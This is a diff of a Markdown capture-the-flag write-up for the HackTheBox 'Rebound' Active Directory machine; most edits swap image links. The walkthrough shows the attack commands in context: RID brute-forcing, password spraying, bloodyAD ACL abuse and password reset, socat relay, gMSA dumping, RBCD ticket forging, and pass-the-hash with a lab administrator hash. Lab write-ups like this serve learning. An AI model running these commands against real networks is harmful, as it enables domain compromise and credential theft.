@@ -69,7 +69,7 @@
 
 ### 📝 Next Steps
 
-#### Add hostnames to /etc/hostss````
+#### Add hostnames to /etc/hostss
 ### DNS
 ```
  echo '10.10.11.231 rebound.htb dc01.rebound.htb' >> /etc/hosts
@@ -79,12 +79,12 @@
 
 #### The SMB authentication using the `Guest` account without a password was successful, granting read access to shared resources.
 
-![[Pasted image 20250810222722.png]]
+![](assets/img/writeups/rebound/nxcRebound1.png)
 #### Using the `--rid-brute` option, I can perform RID brute-forcing to enumerate valid user accounts via SMB.
 ```
  nxc smb dc01.rebound.htb -u 'Guest' -p ''   --rid-brute 30000
 ```
-![[Pasted image 20250810222838.png]]
+![](assets/img/writeups/rebound/nxcRebound2.png)
 #### Creating a wordlist whit all the (SidTypeUser) from the rid brute force
 ```
 cat users.txt
@@ -121,7 +121,7 @@ GetUserSPNs.py -no-preauth jjones -usersfile users.txt -dc-host 10.10.11.231 reb
 
 ### PasswordSpraying 
 #### We can perform password spraying attacks and have identified that the user `oorend` shares the same password as `ldap_monitor`.
-![[Pasted image 20250805215420.png]]
+![](assets/img/writeups/rebound/nxcSpray3.png)
 ### Bloodhound  whit oorend
 #### We can use `nxc ldap` to extract domain information for BloodHound, enabling visualization of potential escalation paths.
 ```
@@ -129,21 +129,21 @@ nxc ldap dc01.rebound.htbb -u 'oorend' -p 'pass.txt' -k -c all --bloodhound --dn
 ```
 ## Privilege escalation pathway mapped out with BloodHound.
 #### The BloodHound data reveals a clear escalation path: the user `oorend` has the ability to add itself to the `ServiceMgmt` group. Members of `ServiceMgmt` possess `GenericAll` rights over the `Service Users` group, which includes the `winrm_svc` account. Since `winrm_svc` is configured as a Remote Desktop user, this enables `oorend` to gain remote access to the system, making this attack path both logical and effective.
-![[Pasted image 20250805215805.png]]
+![](assets/img/writeups/rebound/blood4.png)
 ### AddSelf to ServiceMGMT
-![[Pasted image 20250805215638.png]]
+![](assets/img/writeups/rebound/add5.png)
 ```
  bloodyAD -k --host dc01.rebound.htb -d rebound.htb -u oorend -p '1GR8t@$$4u' add groupMember servicemgmt oorend
 [+] oorend added to servicemgmt
 ```
 ### GenericAll on Service Users
-![[Pasted image 20250805222514.png]]
+![](assets/img/writeups/rebound/generic6.png)
 ```
  bloodyAD -k --host dc01.rebound.htb -d rebound.htb -u oorend -p '1GR8t@$$4u' add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
 [+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
 ```
 ### GenericAll on winrm_svc, changing his password
-![[Pasted image 20250805222719.png]]
+![](assets/img/writeups/rebound/generic7.png)
 ```
  bloodyAD --host dc01.rebound.htb -d rebound.htb -u oorend -p '1GR8t@$$4u' set password winrm_svc 'Password123!'
 [+] Password changed successfully!
@@ -151,15 +151,15 @@ nxc ldap dc01.rebound.htbb -u 'oorend' -p 'pass.txt' -k -c all --bloodhound --dn
 ### Winrm_svc Enumeration
 #### Now that the password for `winrm_svc` has been changed, we can connect using Evil-WinRM and proceed with privilege escalation enumeration
 
-![[Pasted image 20250805223151.png]]
+![](assets/img/writeups/rebound/whoami8.png)
 
-![[Pasted image 20250805230552.png]]
+![](assets/img/writeups/rebound/Sharp9.png)
 #### Nothing interesting appears from the `whoami /all` output. However, running `Get-Process` reveals that a process with ID 1 is running `explorer.exe`, suggesting another user is logged into the session. Previously, I uploaded SharpHound data and imported the ZIP into BloodHound, but this did not yield any new information or update the existing graph.
 
 #### I uploaded RunasCs and checked the sessions using `qwinsta`. It revealed that the user `tbrady` is currently connected and active.
 
 #### [RunAsCs](https://github.com/antonioCoco/RunasCs) is a tool that allows for running as different users with creds.
-![[Pasted image 20250805235512.png]]
+![](assets/img/writeups/rebound/Runas10.png)
 
 ## ### Cross Session Relay
 
@@ -175,27 +175,27 @@ nxc ldap dc01.rebound.htbb -u 'oorend' -p 'pass.txt' -k -c all --bloodhound --dn
 sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 &
 ```
 
-![[Pasted image 20250807184828.png]]
-![[Pasted image 20250807184943.png]]
+![](assets/img/writeups/rebound/Remote11.png)
+![](assets/img/writeups/rebound/crack12.png)
 ## ReadGmsaPassword on delegator$
 #### I already noted that TBrady has ReadGMSAPassword on Delegator$. [This page](https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword) from Hacker Recipes has a bunch of ways to do it. I’ll use netexec to dump it:
 
-![[Pasted image 20250807185326.png]]
+![](assets/img/writeups/rebound/Readgmsa13.png)
 ```
 nxc ldap dc01.rebound.htb -u 'tbrady' -p 'pass.txt' --gmsa -k
 ```
-![[Pasted image 20250807185304.png]]
+![](assets/img/writeups/rebound/NxcGmsa14.png)
 ## ## Shell as Administrator
 
 ### Enumeration
 
 #### In Bloodhound, looking at the now owned Delegator object, there’s information about delegation:
-![[Pasted image 20250810222405.png]]
+![](assets/img/writeups/rebound/Delegation15.png)
 #### Delegator is allowed to delegate on `HTTP/dc01.rebound.htb` and its SPN is `browser/dc01.rebound.htb`.
 #### Using S4U2Self to get a ticket for the administrator user for delegator, and then trying to use S4U2Proxy to forward it, but it doesn’t work. The `-self` flag tells `getSt.py` to stop after the S4U2Self, getting a ticket for administrator for delegator$. The resulting ticket is missing the forwardable flag:
 
-![[Pasted image 20250807191247.png]]
-![[Pasted image 20250807191654.png]]
+![](assets/img/writeups/rebound/GetST16.png)
+![](assets/img/writeups/rebound/Describe17.png)
 ### Resource-Based Constrained Delegation
 
 #### Background
@@ -218,20 +218,23 @@ To move forward with this attack, I’m going to set ldap_monitor as a trusted t
 All of this together updates the RBCD list
 #### One other note - I lost a ton of time getting “invalid server address” errors for not having “dc01” associated with the IP of the box in my `/etc/hosts` file.
 
-![[Pasted image 20250807195228.png]]
-![[Pasted image 20250807195505.png]]
+![](assets/img/writeups/rebound/rbcd18.png)
+![](assets/img/writeups/rebound/findeleg19.png)
 #### #### Get ST / TGS Ticket for DC01$ on delegator$
 
 #### Now, the ldap_monitor account is able to request a service ticket as any user on delegator$. I’m going to target the DC computer account, because the administrator account is marked as sensitive, which gives the `NOT_DELEGATED` flag:
-![[Pasted image 20250807195628.png]]
+![](assets/img/writeups/rebound/bloody20.png)
+
 #### Create ST / TGS Ticket
 #### I’ll get a ST / TGS ticket as DC01$ on delegator$ with `getST.py`:
-![[Pasted image 20250807200128.png]]![[Pasted image 20250807200159.png]]
+![](assets/img/writeups/rebound/GetST21.png)
 
-![[Pasted image 20250807200605.png]]
+![](assets/img/writeups/rebound/Describe22.png)
+
+![](assets/img/writeups/rebound/GetST23.png)
 #### Dump Hashes
 #### With this ticket as the machine account, I can dump hashes from the DC. The `KRB5CCNAME` environment variable will point to the ticket, and then the `-k` and `-no-pass` options will tell `secretsdump.py` to use it:
-![[Pasted image 20250807200824.png]]
+![](assets/img/writeups/rebound/Dump24.png)
 ```
 evil-winrm -i rebound.htb -u administrator -H 176be138594933bb67db3b2572fc91b8 
 Evil-WinRM shell v3.4 
